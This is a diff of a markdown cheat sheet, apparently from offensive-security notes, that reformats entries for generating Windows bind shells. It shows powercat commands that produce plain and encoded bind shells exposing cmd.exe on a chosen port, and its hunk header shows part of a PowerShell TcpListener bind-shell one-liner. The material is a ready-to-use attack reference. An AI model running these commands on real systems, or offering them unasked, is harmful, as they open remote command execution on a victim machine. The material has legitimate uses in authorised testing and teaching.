@@ -8,13 +8,17 @@ C:\> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0
 
 ## 02 - Generate via Powercat
 
-- Generate bind shell
+Generate bind shell.
 
-`PS C:\> powercat -l -p <PORT> -e cmd.exe -g`
+```
+> powercat -l -p <PORT> -e cmd.exe -g
+```
 
-- Generate encoded bind shell
+Generate encoded bind shell.
 
-`PS C:\> powercat -l -p <PORT> -e cmd.exe -ge`
+```
+> powercat -l -p <PORT> -e cmd.exe -ge
+```
 
 ## References
 
